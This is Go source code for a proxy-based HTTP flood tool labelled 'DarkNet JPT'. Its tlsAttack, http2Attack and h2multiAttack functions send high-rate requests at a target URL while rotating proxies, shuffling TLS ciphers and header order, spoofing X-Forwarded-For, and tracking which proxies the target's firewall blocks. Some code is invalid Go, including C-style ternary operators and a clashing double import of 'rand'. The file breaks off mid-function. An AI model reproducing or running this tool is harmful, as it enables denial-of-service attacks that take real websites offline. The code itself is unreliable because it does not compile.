package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/chromedp/chromedp"
	"github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/gorilla/websocket"
	"github.com/lucas-clemente/quic-go"
	"github.com/lucas-clemente/quic-go/http3"
	"github.com/valyala/fasthttp"
	"golang.org/x/exp/slices"
	"golang.org/x/net/http2"
)

type Options struct {
	autorate        bool
	bot             bool
	botauto         bool
	maxhpack        bool
	weakhpack       bool
	maxtls          bool
	weaktls         bool
	maxhttp2        bool
	weakhttp2       bool
	maxerror        bool
	weakerror       bool
	maxconfig       bool
	weakconfig      bool
	maxpost         bool
	weakpost        bool
	fingerprint     string
	burst           int
	simulateFlow    bool
	compression     string
	connectionLimit int
	maxConnections  int
	maxconnsT       bool
	config          string
	query           string
	hcookie         string
	refererValue    string
	postdata        string
	customHeaders   string
	randomstring    string
	method          string
	threads         int
	rate            int
	time            int
	proxyfile       string
	maxStreams      int
	payloadSize     int
	cacheBypass     bool
	queryDepth      int
	mixRatio        map[string]float64
}

type ProxyStats struct {
	Success int
	Failed  int
	Bytes   int
	Points  float64
	Latency time.Duration
}

type Bot struct {
	target             string
	options            Options
	currentRate        int64
	mode               string
	qTable             map[string]float64
	maxQTableSize      int
	cpuThreshold       float64
	memoryThreshold    float64
	successRate        float64
	latency            float64
	streamCount        int
	queryDepth         int
	threads            int
	errorRate          float64
	responseSize       float64
	lastRequestTime    int64
	activeConnections  int64
	proxyList          []string
	currentProxyIndex  int
	proxyStats         map[string]*ProxyStats
	maxProxyErrors     int
	proxyPointThreshold int
	networkUsage       float64
	combinedModes      []string
	systemInfo         map[string]interface{}
	errorLog           []string
	performanceHistory []map[string]interface{}
	banditWeights      map[string]struct{ count int; value float64 }
	statusCounts       map[string]int
	rps                float64
	blockPercentage    float64
	proxyAlivePercentage float64
	wafType            string
	challengeType      string
	weakModes          []string
	modeHistoryScores  map[string]float64
	ja3List            []string
	acceptEncodings    []string
	secFetchs          []string
	languages          []string
	burstMode          bool
	burstInterval      *time.Ticker
	rotationInterval   *time.Ticker
	hybridWeights      map[string]float64
	requestCount       int64
	currentMethod      string
}

var (
	totalRequests     int64
	successRequests   int64
	failedRequests    int64
	networkUsage      float64
	startTime         = time.Now().UnixNano() / 1e6
	proxies           []string
	validModes        = []string{"tls", "http2", "h2multi", "graphql", "rapid", "api", "http3", "ws", "cachebypass", "headless", "introspection", "mixed"}
	uaList            = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0",
		"Opera/9.80 (Android; Opera Mini/7.5.54678/28.2555; U; ru) Presto/2.10.289 Version/12.02",
		"Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; Trident/6.0; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
		"Mozilla/5.0 (Android 11; Mobile; rv:99.0) Gecko/99.0 Firefox/99.0",
		"Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/99.0.4844.59 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 10; JSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
	}
	cplist            = []string{
		"ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH",
		"ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH",
		"ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
		"ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
		"ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
		"ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
		"ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
		"ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
		"ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES",
	}
	statusCodeStats   = make(map[string]int)
	blockedProxies    = make(map[string]bool)
	proxyStats        = make(map[string]*ProxyStats)
	mutex             sync.Mutex
	wg                sync.WaitGroup
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func ra() string {
	charset := "0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz"
	b := make([]byte, 4)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func randstrr(length int) string {
	charset := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func generateRandomString(minLength, maxLength int) string {
	charset := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	length := rand.Intn(maxLength-minLength+1) + minLength
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func generateRandomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

func getPoissonInterval(lambda float64) time.Duration {
	return time.Duration(-math.Log(1.0-rand.Float64())/lambda*1000) * time.Millisecond
}

func headersToString(headers map[string]string) string {
	var builder strings.Builder
	for k, v := range headers {
		builder.WriteString(fmt.Sprintf("%s: %s\r\n", k, v))
	}
	return builder.String()
}

func parseStatus(data string) string {
	lines := strings.SplitN(data, "\r\n", 2)
	if len(lines) > 0 && strings.HasPrefix(lines[0], "HTTP/") {
		parts := strings.Split(lines[0], " ")
		if len(parts) >= 2 {
			return parts[1]
		}
	}
	return "unknown"
}

func getCipherSuites(cipher string) []uint16 {
	cipherMap := map[string][]uint16{
		"ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH": {
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		},
		"ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH": {
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			tls.TLS_RSA_WITH_RC4_128_SHA,
		},
		"ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH": {
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		},
		"ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES": {
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_RSA_WITH_3DES_EDE_CBC_SHA,
		},
		"ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES": {
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256,
			tls.TLS_RSA_WITH_3DES_EDE_CBC_SHA,
		},
		"ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES": {
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
			tls.TLS_RSA_WITH_3DES_EDE_CBC_SHA,
		},
		"ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES": {
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_3DES_EDE_CBC_SHA,
		},
		"ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES": {
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384,
			tls.TLS_RSA_WITH_3DES_EDE_CBC_SHA,
		},
		"ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES": {
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
			tls.TLS_RSA_WITH_3DES_EDE_CBC_SHA,
		},
	}
	if suites, ok := cipherMap[cipher]; ok {
		return shuffleCipherSuites(suites)
	}
	return shuffleCipherSuites([]uint16{
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
	})
}

func shuffleCipherSuites(suites []uint16) []uint16 {
	result := make([]uint16, len(suites))
	copy(result, suites)
	rand.Shuffle(len(result), func(i, j int) {
		result[i], result[j] = result[j], result[i]
	})
	return result
}

func validateProxy(proxy string) bool {
	parts := strings.Split(proxy, ":")
	if len(parts) != 2 {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy format: %s", proxy)
		return false
	}
	host, port := parts[0], parts[1]
	if host == "" || port == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy host or port: %s", proxy)
		return false
	}
	conn, err := net.DialTimeout("tcp", proxy, 2*time.Second)
	if err != nil {
		log.Printf("[DarkNet JPT] [WARN] Proxy %s validation error: %v", proxy, err)
		return false
	}
	defer conn.Close()
	fmt.Fprintf(conn, "GET http://example.com HTTP/1.1\r\nHost: example.com\r\n\r\n")
	buf := make([]byte, 1024)
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	n, err := conn.Read(buf)
	if err != nil || !strings.Contains(string(buf[:n]), "HTTP/1.1") {
		log.Printf("[DarkNet JPT] [WARN] Proxy %s HTTP test failed: %v", proxy, err)
		return false
	}
	return true
}

func updateProxyStats(proxy string, success, failed, bytes int) {
	mutex.Lock()
	defer mutex.Unlock()
	if _, ok := proxyStats[proxy]; !ok {
		proxyStats[proxy] = &ProxyStats{}
	}
	proxyStats[proxy].Success += success
	proxyStats[proxy].Failed += failed
	proxyStats[proxy].Bytes += bytes
	proxyStats[proxy].Points = float64(proxyStats[proxy].Success) / (float64(proxyStats[proxy].Failed+1)) * float64(proxyStats[proxy].Bytes) / 1024
}

func logStatsToFile() {
	mutex.Lock()
	defer mutex.Unlock()
	stats := map[string]interface{}{
		"total_requests":   totalRequests,
		"success_requests": successRequests,
		"failed_requests":  failedRequests,
		"network_usage":    networkUsage,
		"status_codes":     statusCodeStats,
		"blocked_proxies":  blockedProxies,
		"proxy_stats":      proxyStats,
		"timestamp":        time.Now().Unix(),
	}
	data, _ := json.MarshalIndent(stats, "", "  ")
	os.WriteFile("stats.json", data, 0644)
}

func generatePostData(options Options) string {
	if options.maxpost {
		data := make([]map[string]string, 1000)
		for i := range data {
			data[i] = map[string]string{
				"id":    randstrr(10),
				"value": generateRandomString(100, options.payloadSize),
			}
		}
		b, _ := json.Marshal(data)
		return string(b)
	} else if options.weakpost {
		data := map[string]string{
			"id":    randstrr(10),
			"value": generateRandomString(10, 50),
		}
		b, _ := json.Marshal(data)
		return string(b)
	} else if options.postdata != "" {
		return strings.ReplaceAll(options.postdata, "%RAND%", ra())
	}
	return ""
}

func generateBrowserConfig(fingerprint string) map[string]string {
	validFingerprints := []string{"desktop", "mobile", "tablet", "random"}
	if !slices.Contains(validFingerprints, fingerprint) {
		log.Printf("[DarkNet JPT] [WARN] Invalid fingerprint: %s. Using random.", fingerprint)
		fingerprint = "random"
	}
	deviceCategory := fingerprint
	if fingerprint == "random" {
		categories := []string{"desktop", "mobile", "tablet"}
		deviceCategory = categories[rand.Intn(3)]
	}
	ua := uaList[rand.Intn(len(uaList))]
	brands := []string{`"Chromium";v="100"`, `"Google Chrome";v="100"`, `"Not A;Brand";v="99"`}
	rand.Shuffle(len(brands), func(i, j int) {
		brands[i], brands[j] = brands[j], brands[i]
	})
	return map[string]string{
		"user-agent":         ua,
		"sec-ch-ua":         strings.Join(brands, ", "),
		"sec-ch-ua-mobile":  deviceCategory == "mobile" ? "?1" : "?0",
		"sec-ch-ua-platform": fmt.Sprintf(`"%s"`, map[string]string{"desktop": "Windows", "mobile": "Android", "tablet": "iPad"}[deviceCategory]),
		"accept-language":   []string{"en-US,en;q=0.9", "fr-FR,fr;q=0.8", "es-ES,es;q=0.7"}[rand.Intn(3)],
		"sec-fetch-mode":    []string{"navigate", "same-origin", "no-cors"}[rand.Intn(3)],
		"sec-fetch-dest":    []string{"document", "iframe", "script"}[rand.Intn(3)],
		"sec-fetch-site":    []string{"same-origin", "same-site", "cross-site"}[rand.Intn(3)],
		"sec-fetch-user":    "?1",
		"x-session-id":      randstrr(16),
	}
}

func randomizeTLSConfig() *tls.Config {
	return &tls.Config{
		InsecureSkipVerify: true,
		CipherSuites:       shuffleCipherSuites(tls.CipherSuites()),
		CurvePreferences:   []tls.CurveID{tls.CurveP256, tls.CurveP384, tls.CurveP521, tls.X25519},
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
		NextProtos:         []string{"h2", "http/1.1", fmt.Sprintf("proto-%s", ra())},
	}
}

func tlsAttack(proxy, target, reqmethod string, rate int, options Options, bot *Bot) {
	parsed, err := url.Parse(target)
	if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") || parsed.Host == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid URL: %s", target)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	parts := strings.Split(proxy, ":")
	if len(parts) != 2 {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy format: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	proxyHost, proxyPort := parts[0], parts[1]
	if proxyHost == "" || proxyPort == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy host or port: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	validMethods := []string{"GET", "POST", "HEAD"}
	reqmethod = strings.ToUpper(reqmethod)
	if !slices.Contains(validMethods, reqmethod) {
		log.Printf("[DarkNet JPT] [WARN] Invalid HTTP method: %s. Defaulting to GET", reqmethod)
		reqmethod = "GET"
	}
	if rate <= 0 {
		log.Printf("[DarkNet JPT] [WARN] Invalid rate: %d. Defaulting to 100", rate)
		rate = 100
	}
	conn, err := net.DialTimeout("tcp", proxyHost+":"+proxyPort, 2*time.Second)
	if err != nil {
		log.Printf("[DarkNet JPT] [WARN] Proxy connect error: %v", err)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		logStatsToFile()
		return
	}
	defer conn.Close()
	fmt.Fprintf(conn, "CONNECT %s:443 HTTP/1.1\r\nHost: %s:443\r\n\r\n", parsed.Host, parsed.Host)
	buf := make([]byte, 1024)
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	n, err := conn.Read(buf)
	if err != nil || !strings.Contains(string(buf[:n]), "200") {
		log.Printf("[DarkNet JPT] [WARN] Proxy connect failed: %v", err)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		logStatsToFile()
		return
	}
	tlsConn := tls.Client(conn, randomizeTLSConfig())
	defer tlsConn.Close()
	wg.Add(1)
	go func() {
		defer wg.Done()
		currentRate := int64(rate)
		if options.autorate {
			currentRate = atomic.LoadInt64(&bot.currentRate)
		}
		for {
			for j := 0; j < int(currentRate); j++ {
				path := parsed.Path
				if parsed.RawQuery != "" {
					path += "?" + parsed.RawQuery
				}
				if options.randomstring != "" {
					path = strings.ReplaceAll(path, "%RAND%", ra()) + fmt.Sprintf("?%s=%s", options.randomstring, generateRandomString(12, 12))
				} else {
					path = strings.ReplaceAll(path, "%RAND%", ra())
				}
				headers := generateBrowserConfig(options.fingerprint)
				headers["Host"] = parsed.Host
				headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
				headers["Accept-Encoding"] = options.compression
				headers["Connection"] = "keep-alive"
				if options.hcookie != "" {
					headers["Cookie"] = options.hcookie
				}
				if options.refererValue != "" {
					headers["Referer"] = options.refererValue
				}
				if options.customHeaders != "" {
					for _, header := range strings.Split(options.customHeaders, "#") {
						parts := strings.SplitN(header, "=", 2)
						if len(parts) == 2 {
							headers[parts[0]] = parts[1]
						}
					}
				}
				var request strings.Builder
				request.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", reqmethod, path))
				headerKeys := make([]string, 0, len(headers))
				for k := range headers {
					headerKeys = append(headerKeys, k)
				}
				rand.Shuffle(len(headerKeys), func(i, j int) {
					headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
				})
				for _, k := range headerKeys {
					request.WriteString(fmt.Sprintf("%s: %s\r\n", k, headers[k]))
				}
				request.WriteString("\r\n")
				if reqmethod == "POST" {
					request.WriteString(generatePostData(options))
				}
				tlsConn.SetWriteDeadline(time.Now().Add(2 * time.Second))
				_, err := tlsConn.Write([]byte(request.String()))
				if err != nil {
					log.Printf("[DarkNet JPT] [WARN] TLS write error: %v", err)
					continue
				}
				atomic.AddInt64(&totalRequests, 1)
				networkUsage += float64(len(request.String()))
			}
			if options.autorate && bot.successRate < 0.5 {
				newRate := int64(float64(currentRate) * 0.8)
				atomic.StoreInt64(&bot.currentRate, newRate)
			}
			time.Sleep(getPoissonInterval(float64(currentRate) / 1000))
		}
	}()
	bypassTLS := func() {
		if rand.Float64() < 0.3 {
			headers := generateBrowserConfig("random")
			headers["X-Forwarded-For"] = generateRandomIP()
			headers["Accept-Encoding"] = []string{"gzip", "deflate", "br"}[rand.Intn(3)]
			var request strings.Builder
			request.WriteString(fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n", parsed.Path, parsed.Host))
			headerKeys := make([]string, 0, len(headers))
			for k := range headers {
				headerKeys = append(headerKeys, k)
			}
			rand.Shuffle(len(headerKeys), func(i, j int) {
				headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
			})
			for _, k := range headerKeys {
				request.WriteString(fmt.Sprintf("%s: %s\r\n", k, headers[k]))
			}
			request.WriteString("\r\n")
			tlsConn.SetWriteDeadline(time.Now().Add(2 * time.Second))
			tlsConn.Write([]byte(request.String()))
		}
	}
	go bypassTLS()
	buf = make([]byte, 4096)
	for {
		tlsConn.SetReadDeadline(time.Now().Add(2 * time.Second))
		n, err := tlsConn.Read(buf)
		if err != nil {
			log.Printf("[DarkNet JPT] [WARN] TLS socket error: %v", err)
			atomic.AddInt64(&failedRequests, 1)
			updateProxyStats(proxy, 0, 1, 0)
			logStatsToFile()
			return
		}
		status := parseStatus(string(buf[:n]))
		log.Printf("[DarkNet JPT] [SEND] %s ...", status)
		mutex.Lock()
		statusCodeStats[status]++
		if status == "403" || status == "429" {
			blockedProxies[proxy] = true
			log.Printf("[DarkNet JPT] [WARN] Proxy %s blocked by target firewall", proxy)
		}
		mutex.Unlock()
		if slices.Contains([]string{"200", "201", "202"}, status) {
			atomic.AddInt64(&successRequests, 1)
		} else {
			atomic.AddInt64(&failedRequests, 1)
		}
		updateProxyStats(proxy, slices.Contains([]string{"200", "201", "202"}, status)?1:0, !slices.Contains([]string{"200", "201", "202"}, status)?1:0, n)
		logStatsToFile()
	}
}

func http2Attack(proxy, target, reqmethod string, rate int, options Options, bot *Bot) {
	parsed, err := url.Parse(target)
	if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") || parsed.Host == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid URL: %s", target)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	parts := strings.Split(proxy, ":")
	if len(parts) != 2 {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy format: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	proxyHost, proxyPort := parts[0], parts[1]
	if proxyHost == "" || proxyPort == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy host or port: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	validMethods := []string{"GET", "POST", "HEAD"}
	reqmethod = strings.ToUpper(reqmethod)
	if !slices.Contains(validMethods, reqmethod) {
		log.Printf("[DarkNet JPT] [WARN] Invalid HTTP method: %s. Defaulting to GET", reqmethod)
		reqmethod = "GET"
	}
	if rate <= 0 {
		log.Printf("[DarkNet JPT] [WARN] Invalid rate: %d. Defaulting to 100", rate)
		rate = 100
	}
	client := &http.Client{
		Transport: &http2.Transport{
			TLSClientConfig:    randomizeTLSConfig(),
			MaxHeaderListSize:  uint32(options.maxhpack ? 65536 : 16384),
			MaxConcurrentStreams: uint32(options.maxStreams),
			DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
				conn, err := net.DialTimeout("tcp", proxyHost+":"+proxyPort, 2*time.Second)
				if err != nil {
					return nil, err
				}
				fmt.Fprintf(conn, "CONNECT %s:443 HTTP/1.1\r\nHost: %s:443\r\n\r\n", parsed.Host, parsed.Host)
				buf := make([]byte, 1024)
				conn.SetReadDeadline(time.Now().Add(2 * time.Second))
				n, err := conn.Read(buf)
				if err != nil || !strings.Contains(string(buf[:n]), "200") {
					conn.Close()
					return nil, fmt.Errorf("proxy connect failed")
				}
				return tls.Client(conn, cfg), nil
			},
		},
		Timeout: 10 * time.Second,
	}
	wg.Add(1)
	go func() {
		defer wg.Done()
		currentRate := int64(rate)
		if options.autorate {
			currentRate = atomic.LoadInt64(&bot.currentRate)
		}
		for {
			for j := 0; j < int(currentRate); j++ {
				path := parsed.Path
				if parsed.RawQuery != "" {
					path += "?" + parsed.RawQuery
				}
				if options.randomstring != "" {
					path = strings.ReplaceAll(path, "%RAND%", ra()) + fmt.Sprintf("?%s=%s", options.randomstring, generateRandomString(12, 12))
				} else {
					path = strings.ReplaceAll(path, "%RAND%", ra())
				}
				headers := generateBrowserConfig(options.fingerprint)
				headers[":method"] = reqmethod
				headers[":authority"] = parsed.Host
				headers[":scheme"] = parsed.Scheme
				headers[":path"] = path
				headers["Accept"] = "application/json"
				headers["Accept-Encoding"] = options.compression
				if options.hcookie != "" {
					headers["cookie"] = options.hcookie
				}
				if options.refererValue != "" {
					headers["referer"] = options.refererValue
				}
				if options.customHeaders != "" {
					for _, header := range strings.Split(options.customHeaders, "#") {
						parts := strings.SplitN(header, "=", 2)
						if len(parts) == 2 {
							headers[parts[0]] = parts[1]
						}
					}
				}
				var body io.Reader
				if reqmethod == "POST" {
					body = strings.NewReader(generatePostData(options))
				}
				req, _ := http.NewRequest(reqmethod, target+path, body)
				headerKeys := make([]string, 0, len(headers))
				for k := range headers {
					headerKeys = append(headerKeys, k)
				}
				rand.Shuffle(len(headerKeys), func(i, j int) {
					headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
				})
				for _, k := range headerKeys {
					req.Header.Set(k, headers[k])
				}
				resp, err := client.Do(req)
				atomic.AddInt64(&totalRequests, 1)
				networkUsage += float64(len([]byte(req.URL.String())))
				if err != nil {
					log.Printf("[DarkNet JPT] [WARN] HTTP/2 request error: %v", err)
					atomic.AddInt64(&failedRequests, 1)
					updateProxyStats(proxy, 0, 1, 0)
					logStatsToFile()
					continue
				}
				defer resp.Body.Close()
				data, _ := io.ReadAll(resp.Body)
				if len(data) > 1024*1024 {
					log.Printf("[DarkNet JPT] [WARN] Response too large: %d bytes", len(data))
					continue
				}
				status := fmt.Sprintf("%d", resp.StatusCode)
				log.Printf("[DarkNet JPT] [SEND] %s ...", status)
				mutex.Lock()
				statusCodeStats[status]++
				if status == "403" || status == "429" {
					blockedProxies[proxy] = true
					log.Printf("[DarkNet JPT] [WARN] Proxy %s blocked by target firewall", proxy)
				}
				mutex.Unlock()
				if slices.Contains([]string{"200", "201", "202"}, status) {
					atomic.AddInt64(&successRequests, 1)
				} else {
					atomic.AddInt64(&failedRequests, 1)
				}
				updateProxyStats(proxy, slices.Contains([]string{"200", "201", "202"}, status)?1:0, !slices.Contains([]string{"200", "201", "202"}, status)?1:0, len(data))
				logStatsToFile()
			}
			if options.autorate && bot.successRate < 0.5 {
				newRate := int64(float64(currentRate) * 0.8)
				atomic.StoreInt64(&bot.currentRate, newRate)
			}
			time.Sleep(getPoissonInterval(float64(currentRate) / 1000))
		}
	}()
	bypassHTTP2 := func() {
		if rand.Float64() < 0.3 {
			headers := generateBrowserConfig("random")
			headers["X-Forwarded-For"] = generateRandomIP()
			headers["Accept-Encoding"] = []string{"gzip", "deflate", "br"}[rand.Intn(3)]
			req, _ := http.NewRequest("GET", target+parsed.Path, nil)
			headerKeys := make([]string, 0, len(headers))
			for k := range headers {
				headerKeys = append(headerKeys, k)
			}
			rand.Shuffle(len(headerKeys), func(i, j int) {
				headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
			})
			for _, k := range headerKeys {
				req.Header.Set(k, headers[k])
			}
			client.Do(req)
		}
	}
	go bypassHTTP2()
}

func h2multiAttack(proxy, target, reqmethod string, rate int, options Options, bot *Bot) {
	parsed, err := url.Parse(target)
	if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") || parsed.Host == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid URL: %s", target)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	parts := strings.Split(proxy, ":")
	if len(parts) != 2 {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy format: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	proxyHost, proxyPort := parts[0], parts[1]
	if proxyHost == "" || proxyPort == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy host or port: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	validMethods := []string{"GET", "POST", "HEAD"}
	reqmethod = strings.ToUpper(reqmethod)
	if !slices.Contains(validMethods, reqmethod) {
		log.Printf("[DarkNet JPT] [WARN] Invalid HTTP method: %s. Defaulting to GET", reqmethod)
		reqmethod = "GET"
	}
	if rate <= 0 {
		log.Printf("[DarkNet JPT] [WARN] Invalid rate: %d. Defaulting to 100", rate)
		rate = 100
	}
	client := &http.Client{
		Transport: &http2.Transport{
			TLSClientConfig:    randomizeTLSConfig(),
			MaxHeaderListSize:  uint32(options.maxhpack ? 65536 : 16384),
			MaxConcurrentStreams: uint32(options.maxStreams),
			DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
				conn, err := net.DialTimeout("tcp", proxyHost+":"+proxyPort, 2*time.Second)
				if err != nil {
					return nil, err
				}
				fmt.Fprintf(conn, "CONNECT %s:443 HTTP/1.1\r\nHost: %s:443\r\n\r\n", parsed.Host, parsed.Host)
				buf := make([]byte, 1024)
				conn.SetReadDeadline(time.Now().Add(2 * time.Second))
				n, err := conn.Read(buf)
				if err != nil || !strings.Contains(string(buf[:n]), "200") {
					conn.Close()
					return nil, fmt.Errorf("proxy connect failed")
				}
				return tls.Client(conn, cfg), nil
			},
		},
		Timeout: 10 * time.Second,
	}
	wg.Add(1)
	go func() {
		defer wg.Done()
		currentRate := int64(rate)
		if options.autorate {
			currentRate = atomic.LoadInt64(&bot.currentRate)
		}
		for {
			for j := 0; j < int(currentRate); j++ {
				path := parsed.Path
				if parsed.RawQuery != "" {
					path += "?" + parsed.RawQuery
				}
				if options.randomstring != "" {
					path = strings.ReplaceAll(path, "%RAND%", ra()) + fmt.Sprintf("?%s=%s", options.randomstring, generateRandomString(12, 12))
				} else {
					path = strings.ReplaceAll(path, "%RAND%", ra())
				}
				headers := generateBrowserConfig(options.fingerprint)
				headers[":method"] = reqmethod
				headers[":authority"] = parsed.Host
				headers[":scheme"] = parsed.Scheme
				headers[":path"] = path
				headers["Accept"] = "application/json"
				headers["Accept-Encoding"] = options.compression
				if options.hcookie != "" {
					headers["cookie"] = options.hcookie
				}
				if options.refererValue != "" {
					headers["referer"] = options.refererValue
				}
				if options.customHeaders != "" {
					for _, header := range strings.Split(options.customHeaders, "#") {
						parts := strings.SplitN(header, "=", 2)
						if len(parts) == 2 {
							headers[parts[0]] = parts[1]
						}
					}
				}
				var body io.Reader
				if reqmethod == "POST" {
					body = strings.NewReader(generatePostData(options))
				}
				req, _ := http.NewRequest(reqmethod, target+path, body)
				headerKeys := make([]string, 0, len(headers))
				for k := range headers {
					headerKeys = append(headerKeys, k)
				}
				rand.Shuffle(len(headerKeys), func(i, j int) {
					headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
				})
				for _, k := range headerKeys {
					req.Header.Set(k, headers[k])
				}
				resp, err := client.Do(req)
				atomic.AddInt64(&totalRequests, 1)
